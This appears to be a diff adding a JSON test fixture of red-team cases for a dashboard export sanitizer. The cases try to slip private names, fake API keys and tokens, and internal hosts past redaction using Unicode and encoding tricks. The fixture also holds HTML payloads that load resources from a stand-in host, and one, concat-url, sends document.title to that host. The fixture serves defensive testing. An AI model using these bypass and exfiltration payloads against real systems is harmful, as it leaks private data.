@@ -1,0 +1,1079 @@
+{
+ "_note": "Reviewer repro samples (security review 1), copied from the reviewer's atk.py / atk2.py / atk3.py. tests/test_redteam_reviewer.py asserts only that each is refused (export refuses, leaks nothing, or the gate rejects); never which message. Private IPs are \\u002e-escaped so the repo's own scan does not flag this file.",
+ "cases": [
+  {
+   "id": "zwsp-name",
+   "source": "atk.py",
+   "kind": "export",
+   "ops": [
+    [
+     "set",
+     [
+      "activity",
+      0,
+      "title"
+     ],
+     "fix: falcon​ledger sync"
+    ]
+   ],
+   "probes": [
+    "falcon​ledger"
+   ],
+   "normProbes": [],
+   "mustBeNull": [],
+   "why": ""
+  },
+  {
+   "id": "fullwidth-name",
+   "source": "atk.py",
+   "kind": "export",
+   "ops": [
+    [
+     "set",
+     [
+      "activity",
+      0,
+      "title"
+     ],
+     "fix: ｆａｌｃｏｎ-ledger sync"
+    ]
+   ],
+   "probes": [
+    "ｆａｌｃｏｎ-ledger"
+   ],
+   "normProbes": [],
+   "mustBeNull": [],
+   "why": ""
+  },
+  {
+   "id": "slash-name",
+   "source": "atk.py",
+   "kind": "export",
+   "ops": [
+    [
+     "set",
+     [
+      "activity",
+      0,
+      "title"
+     ],
+     "fix: falcon/ledger sync"
+    ]
+   ],
+   "probes": [
+    "falcon/ledger"
+   ],
+   "normProbes": [],
+   "mustBeNull": [],
+   "why": ""
+  },
+  {
+   "id": "colon-name",
+   "source": "atk.py",
+   "kind": "export",
+   "ops": [
+    [
+     "set",
+     [
+      "activity",
+      0,
+      "title"
+     ],
+     "fix: falcon:ledger sync"
+    ]
+   ],
+   "probes": [
+    "falcon:ledger"
+   ],
+   "normProbes": [],
+   "mustBeNull": [],
+   "why": ""
+  },
+  {
+   "id": "cyrillic",
+   "source": "atk.py",
+   "kind": "export",
+   "ops": [
+    [
+     "set",
+     [
+      "activity",
+      0,
+      "title"
+     ],
+     "fix: fаlcon-ledger"
+    ]
+   ],
+   "probes": [
+    "fаlcon-ledger"
+   ],
+   "normProbes": [],
+   "mustBeNull": [],
+   "why": ""
+  },
+  {
+   "id": "short-snake",
+   "source": "atk.py",
+   "kind": "export",
+   "ops": [
+    [
+     "set",
+     [
+      "activity",
+      0,
+      "title"
+     ],
+     "fix: owl_sync job"
+    ]
+   ],
+   "probes": [
+    "owl_sync"
+   ],
+   "normProbes": [],
+   "mustBeNull": [],
+   "why": ""
+  },
+  {
+   "id": "short-camel",
+   "source": "atk.py",
+   "kind": "export",
+   "ops": [
+    [
+     "set",
+     [
+      "activity",
+      0,
+      "title"
+     ],
+     "fix: OwlSync job"
+    ]
+   ],
+   "probes": [
+    "OwlSync"
+   ],
+   "normProbes": [],
+   "mustBeNull": [],
+   "why": ""
+  },
+  {
+   "id": "short-cjk",
+   "source": "atk.py",
+   "kind": "export",
+   "ops": [
+    [
+     "set",
+     [
+      "activity",
+      0,
+      "title"
+     ],
+     "修复owl问题"
+    ]
+   ],
+   "probes": [
+    "owl"
+   ],
+   "normProbes": [],
+   "mustBeNull": [],
+   "why": ""
+  },
+  {
+   "id": "tsnet",
+   "source": "atk.py",
+   "kind": "export",
+   "ops": [
+    [
+     "set",
+     [
+      "activity",
+      0,
+      "title"
+     ],
+     "deploy: hub at box.tail1a2b.ts.net"
+    ]
+   ],
+   "probes": [
+    "tail1a2b"
+   ],
+   "normProbes": [],
+   "mustBeNull": [],
+   "why": ""
+  },
+  {
+   "id": "bare-domain",
+   "source": "atk.py",
+   "kind": "export",
+   "ops": [
+    [
+     "set",
+     [
+      "activity",
+      0,
+      "title"
+     ],
+     "docs: see wiki.acmecorp.internal/page"
+    ]
+   ],
+   "probes": [
+    "acmecorp"
+   ],
+   "normProbes": [],
+   "mustBeNull": [],
+   "why": ""
+  },
+  {
+   "id": "stripe",
+   "source": "atk.py",
+   "kind": "export",
+   "ops": [
+    [
+     "set",
+     [
+      "activity",
+      0,
+      "title"
+     ],
+     "chore: rotate sk_live_51HxAbCdEfGhIjKlMnOp"
+    ]
+   ],
+   "probes": [
+    "sk_live_51"
+   ],
+   "normProbes": [],
+   "mustBeNull": [],
+   "why": ""
+  },
+  {
+   "id": "jwt",
+   "source": "atk.py",
+   "kind": "export",
+   "ops": [
+    [
+     "set",
+     [
+      "activity",
+      0,
+      "title"
+     ],
+     "test: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0In0.abc"
+    ]
+   ],
+   "probes": [
+    "eyJhbGci"
+   ],
+   "normProbes": [],
+   "mustBeNull": [],
+   "why": ""
+  },
+  {
+   "id": "winpath-D",
+   "source": "atk.py",
+   "kind": "export",
+   "ops": [
+    [
+     "set",
+     [
+      "activity",
+      0,
+      "title"
+     ],
+     "fix D:\\work\\acme\\x"
+    ]
+   ],
+   "probes": [
+    "acme"
+   ],
+   "normProbes": [],
+   "mustBeNull": [],
+   "why": ""
+  },
+  {
+   "id": "semver-meta",
+   "source": "atk.py",
+   "kind": "export",
+   "ops": [
+    [
+     "set",
+     [
+      "runtimes",
+      0,
+      "version"
+     ],
+     "2.0.1+build.secrethost"
+    ]
+   ],
+   "probes": [
+    "secrethost"
+   ],
+   "normProbes": [],
+   "mustBeNull": [],
+   "why": ""
+  },
+  {
+   "id": "hourly-name-in-title",
+   "source": "atk.py",
+   "kind": "export",
+   "ops": [
+    [
+     "set",
+     [
+      "today",
+      "hourly"
+     ],
+     []
+    ],
+    [
+     "set",
+     [
+      "warnings"
+     ],
+     [
+      "disk full on zebra-host"
+     ]
+    ],
+    [
+     "set",
+     [
+      "activity",
+      0,
+      "title"
+     ],
+     "fix zebra-host disk"
+    ]
+   ],
+   "probes": [
+    "zebra-host"
+   ],
+   "normProbes": [],
+   "mustBeNull": [],
+   "why": ""
+  },
+  {
+   "id": "private-branch-in-pub-title",
+   "source": "atk.py",
+   "kind": "export",
+   "ops": [
+    [
+     "set",
+     [
+      "activity",
+      3,
+      "branch"
+     ],
+     "feat/kestrel-client"
+    ],
+    [
+     "set",
+     [
+      "activity",
+      0,
+      "title"
+     ],
+     "merge kestrel-client work"
+    ]
+   ],
+   "probes": [
+    "kestrel-client"
+   ],
+   "normProbes": [],
+   "mustBeNull": [],
+   "why": ""
+  },
+  {
+   "id": "dict-in-number",
+   "source": "atk.py",
+   "kind": "export",
+   "ops": [
+    [
+     "set",
+     [
+      "today",
+      "requests"
+     ],
+     {
+      "zebra": 1
+     }
+    ]
+   ],
+   "probes": [
+    "zebra"
+   ],
+   "normProbes": [],
+   "mustBeNull": [],
+   "why": ""
+  },
+  {
+   "id": "nan",
+   "source": "atk.py",
+   "kind": "export",
+   "ops": [
+    [
+     "set",
+     [
+      "today",
+      "costUsd"
+     ],
+     {
+      "$float": "nan"
+     }
+    ]
+   ],
+   "probes": [],
+   "normProbes": [],
+   "mustBeNull": [],
+   "why": "value NaN: export must refuse or the gate must reject"
+  },
+  {
+   "id": "byproject-public-flag-lie",
+   "source": "atk.py",
+   "kind": "export",
+   "ops": [
+    [
+     "set",
+     [
+      "today",
+      "byProject",
+      1,
+      "public"
+     ],
+     true
+    ]
+   ],
+   "probes": [
+    "falcon-ledger"
+   ],
+   "normProbes": [],
+   "mustBeNull": [],
+   "why": ""
+  },
+  {
+   "id": "quota-hash",
+   "source": "atk.py",
+   "kind": "export",
+   "ops": [
+    [
+     "set",
+     [
+      "quota",
+      0,
+      "account"
+     ],
+     "9f8e7d6c"
+    ]
+   ],
+   "probes": [
+    "9f8e7d6c"
+   ],
+   "normProbes": [],
+   "mustBeNull": [],
+   "why": ""
+  },
+  {
+   "id": "local-public-branch",
+   "source": "atk.py",
+   "kind": "export",
+   "ops": [],
+   "probes": [],
+   "normProbes": [],
+   "mustBeNull": [
+    [
+     "activity",
+     1,
+     "branch"
+    ]
+   ],
+   "why": ""
+  },
+  {
+   "id": "lie-byproject-public-activity-private",
+   "source": "atk2.py",
+   "kind": "export",
+   "ops": [
+    [
+     "set",
+     [
+      "today",
+      "byProject",
+      2,
+      "project"
+     ],
+     "heron-vault"
+    ],
+    [
+     "set",
+     [
+      "today",
+      "byProject",
+      2,
+      "public"
+     ],
+     true
+    ],
+    [
+     "set",
+     [
+      "activity",
+      3,
+      "repo"
+     ],
+     "heron-vault"
+    ]
+   ],
+   "probes": [
+    "heron-vault"
+   ],
+   "normProbes": [],
+   "mustBeNull": [],
+   "why": ""
+  },
+  {
+   "id": "lie-private-gitea-marked-public",
+   "source": "atk3.py",
+   "kind": "export",
+   "ops": [
+    [
+     "set",
+     [
+      "today",
+      "byProject",
+      2,
+      "project"
+     ],
+     "heron-vault"
+    ],
+    [
+     "set",
+     [
+      "today",
+      "byProject",
+      2,
+      "public"
+     ],
+     true
+    ],
+    [
+     "set",
+     [
+      "activity",
+      3,
+      "repo"
+     ],
+     "heron-vault"
+    ],
+    [
+     "set",
+     [
+      "activity",
+      3,
+      "source"
+     ],
+     "gitea"
+    ]
+   ],
+   "probes": [
+    "heron-vault"
+   ],
+   "normProbes": [],
+   "mustBeNull": [],
+   "why": ""
+  },
+  {
+   "id": "title-encoding 'fix falcon%2Dledger'",
+   "source": "atk3.py",
+   "kind": "export",
+   "ops": [
+    [
+     "set",
+     [
+      "activity",
+      0,
+      "title"
+     ],
+     "fix falcon%2Dledger"
+    ]
+   ],
+   "probes": [],
+   "normProbes": [
+    "falcon-ledger"
+   ],
+   "mustBeNull": [],
+   "why": ""
+  },
+  {
+   "id": "title-encoding 'fix falcon&#45;ledger'",
+   "source": "atk3.py",
+   "kind": "export",
+   "ops": [
+    [
+     "set",
+     [
+      "activity",
+      0,
+      "title"
+     ],
+     "fix falcon&#45;ledger"
+    ]
+   ],
+   "probes": [],
+   "normProbes": [
+    "falcon-ledger"
+   ],
+   "mustBeNull": [],
+   "why": ""
+  },
+  {
+   "id": "title-encoding 'fix falcon\\xadledger'",
+   "source": "atk3.py",
+   "kind": "export",
+   "ops": [
+    [
+     "set",
+     [
+      "activity",
+      0,
+      "title"
+     ],
+     "fix falcon­ledger"
+    ]
+   ],
+   "probes": [],
+   "normProbes": [
+    "falcon-ledger"
+   ],
+   "mustBeNull": [],
+   "why": ""
+  },
+  {
+   "id": "title-encoding 'fix falcon‑ledger'",
+   "source": "atk3.py",
+   "kind": "export",
+   "ops": [
+    [
+     "set",
+     [
+      "activity",
+      0,
+      "title"
+     ],
+     "fix falcon‑ledger"
+    ]
+   ],
+   "probes": [],
+   "normProbes": [
+    "falcon-ledger"
+   ],
+   "mustBeNull": [],
+   "why": ""
+  },
+  {
+   "id": "title-encoding 'fix FALCON-LEDGER'",
+   "source": "atk3.py",
+   "kind": "export",
+   "ops": [
+    [
+     "set",
+     [
+      "activity",
+      0,
+      "title"
+     ],
+     "fix FALCON-LEDGER"
+    ]
+   ],
+   "probes": [],
+   "normProbes": [
+    "falcon-ledger"
+   ],
+   "mustBeNull": [],
+   "why": ""
+  },
+  {
+   "id": "title-encoding 'fix Falcon_Ledger'",
+   "source": "atk3.py",
+   "kind": "export",
+   "ops": [
+    [
+     "set",
+     [
+      "activity",
+      0,
+      "title"
+     ],
+     "fix Falcon_Ledger"
+    ]
+   ],
+   "probes": [],
+   "normProbes": [
+    "falcon-ledger"
+   ],
+   "mustBeNull": [],
+   "why": ""
+  },
+  {
+   "id": "requirements-a-d",
+   "source": "atk3.py",
+   "kind": "export",
+   "ops": [
+    [
+     "set",
+     [
+      "machines",
+      0,
+      "role"
+     ],
+     null
+    ],
+    [
+     "set",
+     [
+      "machines",
+      0,
+      "os"
+     ],
+     null
+    ],
+    [
+     "set",
+     [
+      "runtimes",
+      0,
+      "version"
+     ],
+     null
+    ],
+    [
+     "set",
+     [
+      "services",
+      0,
+      "machine"
+     ],
+     null
+    ],
+    [
+     "set",
+     [
+      "tailnet",
+      0,
+      "lastSeen"
+     ],
+     null
+    ],
+    [
+     "append",
+     [
+      "quota"
+     ],
+     {
+      "account": "3f9a1c0e",
+      "agent": "claude-code",
+      "window": "7d",
+      "usedPct": 41,
+      "resetsAt": "2026-11-20T09:00:00+09:00",
+      "sampledAt": "2026-11-17T10:30:00+09:00",
+      "history": []
+     }
+    ],
+    [
+     "set",
+     [
+      "usageDays"
+     ],
+     [
+      {
+       "date": "2026-11-17"
+      }
+     ]
+    ],
+    [
+     "set",
+     [
+      "code"
+     ],
+     "x"
+    ],
+    [
+     "set",
+     [
+      "warnings"
+     ],
+     [
+      "w"
+     ]
+    ],
+    [
+     "set",
+     [
+      "machines",
+      0,
+      "history",
+      0,
+      "diskPct"
+     ],
+     50
+    ],
+    [
+     "set",
+     [
+      "contributions",
+      "githubOfficialTotal"
+     ],
+     9
+    ]
+   ],
+   "probes": [
+    "3f9a1c0e",
+    "diskPct",
+    "githubOfficialTotal",
+    "usageDays",
+    "warnings"
+   ],
+   "normProbes": [],
+   "mustBeNull": [
+    [
+     "activity",
+     1,
+     "branch"
+    ]
+   ],
+   "why": ""
+  },
+  {
+   "id": "srcset-2nd",
+   "source": "atk2.py",
+   "kind": "html",
+   "head": "<img srcset=\"a.png 1x, //cdn.example/b.png 2x\">",
+   "body": "",
+   "dataReplace": null,
+   "why": ""
+  },
+  {
+   "id": "tab-in-slashes",
+   "source": "atk2.py",
+   "kind": "html",
+   "head": "<img src=\"/\t/cdn.example/x.png\">",
+   "body": "",
+   "dataReplace": null,
+   "why": ""
+  },
+  {
+   "id": "backslashes",
+   "source": "atk2.py",
+   "kind": "html",
+   "head": "<script src=\"\\\\cdn.example/x.js\"></script>",
+   "body": "",
+   "dataReplace": null,
+   "why": ""
+  },
+  {
+   "id": "https-backslash",
+   "source": "atk2.py",
+   "kind": "html",
+   "head": "<script src=\"https:\\\\cdn.example/x.js\"></script>",
+   "body": "",
+   "dataReplace": null,
+   "why": ""
+  },
+  {
+   "id": "fetch-backtick",
+   "source": "atk2.py",
+   "kind": "html",
+   "head": "<script>fetch(`//cdn.example/x`)</script>",
+   "body": "",
+   "dataReplace": null,
+   "why": ""
+  },
+  {
+   "id": "setAttribute",
+   "source": "atk2.py",
+   "kind": "html",
+   "head": "<script>i.setAttribute('src','//cdn.example/x')</script>",
+   "body": "",
+   "dataReplace": null,
+   "why": ""
+  },
+  {
+   "id": "meta-refresh",
+   "source": "atk2.py",
+   "kind": "html",
+   "head": "<meta http-equiv=\"refresh\" content=\"0;url=//cdn.example/\">",
+   "body": "",
+   "dataReplace": null,
+   "why": ""
+  },
+  {
+   "id": "background-attr",
+   "source": "atk2.py",
+   "kind": "html",
+   "head": "<table background=\"//cdn.example/x.png\"></table>",
+   "body": "",
+   "dataReplace": null,
+   "why": ""
+  },
+  {
+   "id": "css-escape",
+   "source": "atk2.py",
+   "kind": "html",
+   "head": "<style>b{background:url(\\2f\\2f cdn.example/x.png)}</style>",
+   "body": "",
+   "dataReplace": null,
+   "why": ""
+  },
+  {
+   "id": "concat-url",
+   "source": "atk2.py",
+   "kind": "html",
+   "head": "<script>new Image().src='/'+'/cdn.example/p?'+document.title</script>",
+   "body": "",
+   "dataReplace": null,
+   "why": ""
+  },
+  {
+   "id": "dup-key",
+   "source": "atk2.py",
+   "kind": "html",
+   "head": "",
+   "body": "",
+   "dataReplace": [
+    "{\"schema\"",
+    "{\"tz\":\"Asia/Tokyo\",\"machines\":[{\"id\":\"A\",\"label\":\"heron-vault-host\"}],\"schema\""
+   ],
+   "why": ""
+  },
+  {
+   "id": "second-payload-globalThis",
+   "source": "atk2.py",
+   "kind": "html",
+   "head": "<script>globalThis.GB2={\"label\":\"heron-vault-host\"}</script>",
+   "body": "",
+   "dataReplace": null,
+   "why": ""
+  },
+  {
+   "id": "window['GB'] override",
+   "source": "atk2.py",
+   "kind": "html",
+   "head": "",
+   "body": "<script>window['GB'] = {\"machines\":[{\"label\":\"heron-vault-host\"}]};</script>",
+   "dataReplace": null,
+   "why": ""
+  },
+  {
+   "id": "html \\x66",
+   "source": "atk3.py",
+   "kind": "html",
+   "head": "<script>var a='\\x66alcon-ledger'</script>",
+   "body": "",
+   "dataReplace": null,
+   "why": ""
+  },
+  {
+   "id": "html \\u{66}",
+   "source": "atk3.py",
+   "kind": "html",
+   "head": "<script>var a='\\u{66}alcon-ledger'</script>",
+   "body": "",
+   "dataReplace": null,
+   "why": ""
+  },
+  {
+   "id": "html double-%",
+   "source": "atk3.py",
+   "kind": "html",
+   "head": "<!-- %2566alcon-ledger -->",
+   "body": "",
+   "dataReplace": null,
+   "why": ""
+  },
+  {
+   "id": "html entity+%",
+   "source": "atk3.py",
+   "kind": "html",
+   "head": "<!-- &#37;66alcon-ledger -->",
+   "body": "",
+   "dataReplace": null,
+   "why": ""
+  },
+  {
+   "id": "html soft-hyphen",
+   "source": "atk3.py",
+   "kind": "html",
+   "head": "<!-- falcon­ledger -->",
+   "body": "",
+   "dataReplace": null,
+   "why": ""
+  },
+  {
+   "id": "html nb-hyphen",
+   "source": "atk3.py",
+   "kind": "html",
+   "head": "<!-- falcon‑ledger -->",
+   "body": "",
+   "dataReplace": null,
+   "why": ""
+  },
+  {
+   "id": "html js-concat",
+   "source": "atk3.py",
+   "kind": "html",
+   "head": "<script>var a='falcon'+'-ledger'</script>",
+   "body": "",
+   "dataReplace": null,
+   "why": ""
+  },
+  {
+   "id": "html css-content",
+   "source": "atk3.py",
+   "kind": "html",
+   "head": "<style>a:after{content:'falc\\6f n-ledger'}</style>",
+   "body": "",
+   "dataReplace": null,
+   "why": ""
+  },
+  {
+   "id": "html svg-g-ip",
+   "source": "atk3.py",
+   "kind": "html",
+   "head": "<svg><g d=\"10\u002e1.2.3\"></g></svg>",
+   "body": "",
+   "dataReplace": null,
+   "why": ""
+  },
+  {
+   "id": "html svg-path-ip",
+   "source": "atk3.py",
+   "kind": "html",
+   "head": "<svg><path d=\"M10\u002e1.2.3\"/></svg>",
+   "body": "",
+   "dataReplace": null,
+   "why": ""
+  },
+  {
+   "id": "html svg-viewBox-ip",
+   "source": "atk3.py",
+   "kind": "html",
+   "head": "<svg viewBox=\"192\u002e168.1.20\"></svg>",
+   "body": "",
+   "dataReplace": null,
+   "why": ""
+  },
+  {
+   "id": "json dup key machines",
+   "source": "atk2.py",
+   "kind": "json",
+   "dataReplace": [
+    "{\"schema\"",
+    "{\"machines\":[{\"id\":\"A\",\"label\":\"heron-vault-host\",\"role\":null,\"os\":null,\"online\":true,\"system\":{},\"history\":[]}],\"schema\""
+   ]
+  },
+  {
+   "id": "asset reassign",
+   "source": "atk3.py",
+   "kind": "dir",
+   "index": "<script src=\"data.js\"></script>",
+   "files": {
+    "data.js": "window.GB.machines[0].label = \"heron-host\"; window.GB.tailnet=[{\"name\":\"heron-tab\"}];"
+   }
+  }
+ ]
+}
